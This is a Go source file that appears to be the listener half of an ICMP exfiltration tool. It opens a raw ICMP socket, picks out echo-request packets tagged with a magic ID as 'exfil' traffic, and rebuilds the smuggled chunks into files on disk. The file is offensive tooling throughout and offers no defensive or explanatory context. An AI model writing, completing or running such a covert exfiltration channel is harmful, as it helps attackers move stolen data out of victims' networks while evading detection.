package main

import (
	"fmt"
	"log"
	"os"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func filterICMP(buf []byte, typ ipv4.ICMPType) (bool, *icmp.Message) {
	message, parseError := icmp.ParseMessage(IPV4ICMP, buf)
	if nil != parseError {
		fmt.Println("parse error")
		fmt.Println(parseError)
		return false, (*icmp.Message)(nil)
	}

	// only care about ICMP messages
	if IPV4ICMP != message.Code {
		fmt.Println("non icmp message")
		return false, (*icmp.Message)(nil)
	}

	// only care about specified type of messages
	if typ.Protocol() != message.Type.Protocol() {
		fmt.Println("wrong message type")
		fmt.Printf("wanted %d and got %d\n", typ.Protocol(), message.Type.Protocol())
		return false, (*icmp.Message)(nil)
	}
	return true, message
}

func filterEcho(message *icmp.Message) (bool, *icmp.Echo) {
	// get the underlying echo message
	echoPak, echoErr := message.Body.(*icmp.Echo)
	if false == echoErr {
		fmt.Println("error parsing echo packet")
	}

	// only care about exfil type packets
	if MAGIC != echoPak.ID {
		fmt.Println("non exfil packet")
		return false, (*icmp.Echo)(nil)
	}

	return true, echoPak
}

func recv() {
	buf := make([]byte, BUFFERSIZE+64)
	socket, sockErr := icmp.ListenPacket("ip4:icmp", "")
	if nil != sockErr {
		log.Fatalln(sockErr)
		return
	}
	currentSeq := 0
	var f *os.File
	var err error

	for {
		bytesRead, source, readErr := socket.ReadFrom(buf)
		fmt.Printf("%x\n", buf)

		// failed to read
		if nil != readErr {
			fmt.Println("error reading occured")
			fmt.Println(readErr)
			continue
		}

		// no source given somehow?
		if nil == source {
			fmt.Println("no source")
		}

		// no bytes were read
		if 0 == bytesRead {
			fmt.Println("no bytes read")
		}
		icmpSuccess, message := filterICMP(buf[0:bytesRead], ipv4.ICMPType(IPV4ICMPREQUEST))
		if !icmpSuccess {
			continue
		}

		echoSuccess, echoPak := filterEcho(message)
		if !echoSuccess {
			continue
		}

		exfilPak := parseExfil(echoPak.Data)
		if exfilPak.first {
			f, err = os.Create(exfilPak.filename)
			if nil != err {
				log.Fatalln(err)
			}
			defer f.Close()
		}
		currentSeq++
		f.Write(exfilPak.data)
		if exfilPak.last {
			break
		}
	}

}
